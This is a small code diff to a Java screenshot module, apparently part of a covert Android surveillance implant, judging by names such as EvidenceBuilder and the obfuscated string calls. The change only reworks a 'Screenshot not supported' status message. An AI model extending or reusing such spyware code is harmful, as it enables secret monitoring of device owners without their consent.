@@ -43,6 +43,7 @@ import com.android.mm.M;
 
 /**
  * The Class SnapshotAgent.
+ * "screenshot"
  */
 public class ModuleSnapshot extends BaseInstantModule {
 
@@ -148,14 +149,15 @@ public class ModuleSnapshot extends BaseInstantModule {
 				}
 
 				if (!frameBuffer && !screenCap) {
+					if (!infoScreenSent) {
+						EvidenceBuilder.info(M.e("Screenshot not supported")); //$NON-NLS-1$
+						infoScreenSent = true;
+					}
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (actualStart) Screenshot not supported");
 					}
 				}
-				if (!infoScreenSent) {
-					EvidenceBuilder.info(M.e("Screenshot ")+ ((!frameBuffer && !screenCap)?M.e("not "):"") +M.e("supported") + M.e(" fb=")+frameBuffer + M.e(" screenCap")+ screenCap ); //$NON-NLS-1$
-					infoScreenSent = true;
-				}
+
 			} catch (final Exception ex) {
 				if (Cfg.EXCEPTION) {
 					Check.log(ex);
